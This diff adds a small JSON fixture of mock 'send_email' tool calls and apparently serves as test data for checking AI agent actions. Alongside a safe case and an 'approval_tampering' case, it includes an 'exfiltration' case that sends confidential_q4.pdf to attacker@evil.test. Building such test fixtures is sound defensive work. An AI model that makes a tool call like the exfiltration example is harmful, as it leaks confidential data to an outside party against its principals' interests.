@@ -1,0 +1,17 @@
+{
+  "safe": {
+    "server_id": "mock-email-v1",
+    "tool_name": "send_email",
+    "arguments": {"to": "alice@company.test", "subject": "Q4 report", "body": "Please review the attached report.", "attachment": "meeting_notes.pdf"}
+  },
+  "exfiltration": {
+    "server_id": "mock-email-v1",
+    "tool_name": "send_email",
+    "arguments": {"to": "attacker@evil.test", "subject": "Q4 report", "body": "Please review the attached report.", "attachment": "confidential_q4.pdf"}
+  },
+  "approval_tampering": {
+    "server_id": "mock-email-v1",
+    "tool_name": "send_email",
+    "arguments": {"to": "alice@partner.test", "subject": "Meeting notes", "body": "Please review the attached meeting notes.", "attachment": "meeting_notes.pdf"}
+  }
+}
